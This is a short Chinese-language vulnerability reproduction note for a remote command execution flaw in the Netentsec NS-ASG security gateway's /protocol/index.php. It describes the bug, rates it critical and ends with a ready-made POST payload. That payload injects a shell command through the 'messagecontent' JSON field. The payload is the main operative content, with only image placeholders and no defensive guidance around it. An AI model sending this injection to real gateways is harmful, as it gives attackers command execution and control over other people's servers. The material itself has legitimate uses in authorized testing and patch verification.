# 网康 NS-ASG安全网关 index.php 远程命令执行漏洞

## 漏洞描述
网康 NS-ASG安全网关 index.php文件存在远程命令执行漏洞，攻击者通过构造特殊的请求包可以获取服务器权限

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面

![image-20230314085700163](images/image-20230314085700163.png)

存在漏洞的文件为 /protocol/index.php ，通过文件读取可以获取到源码

![image-20230314085713446](images/image-20230314085713446.png)

![image-20230314085722233](images/image-20230314085722233.png)


## Payloads
```
POST /protocol/index.php
  
jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>1.txt;"}
```
